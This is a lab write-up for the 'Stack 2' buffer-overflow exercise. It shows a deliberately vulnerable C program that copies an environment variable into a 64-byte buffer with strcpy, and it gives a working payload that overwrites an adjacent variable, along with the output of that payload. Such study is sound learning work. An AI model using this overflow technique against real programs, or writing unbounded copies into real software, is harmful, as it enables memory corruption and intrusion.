# STACK 2

## SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");  						// set the environment variable with GREENIE=$(python -c "print 'a'*64 + '\x0a\x0d\x0a\x0d'")

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable); 		 					// vuln is here, this function does not limit the size will be write at "buffer" address

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n"); 			// target
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

## IDEA

- The idea is overwrite stack to change the "modified" variable to 0x0d0a0d0a to go inside true branch of if.

## DETAIL

- The strcpy will copy content of "variable" point to until it gets '\0', it does not limit the size copy, so we can overwrite to stack we need to overwrite 64 bytes to fill up the "buffer" and 0x0d0a0d0a for "modified" variable the value of "modified" variable will look likes this in payload: '\x0a\x0d\x0a\x0d' (the reverse of each 4 bytes is because this program is 32-bit and use little edian).

- But before we get overwrite, we need to entered our input, this program use getenv() to take input, so, we set the envrionment variable with the data we overwrite on stack, 64 bytes and '\x0a\x0d\x0a\x0d'

- Set the environment variable that has name is GREENIE
```
	GREENIE=$(python -c "print 'a'*64 + '\x0a\x0d\x0a\x0d'")
```

- Finally, we run the program, and below is payload to exploit.

## EXPLOIT

- Payload:

```
    GREENIE=$(python -c "print 'a'*64 + '\x0a\x0d\x0a\x0d'") ./stack2
```

## RESULT

```
    $ GREENIE=$(python -c "print 'a'*64 + '\x0a\x0d\x0a\x0d'") ./stack2
    you have correctly modified the variable
```
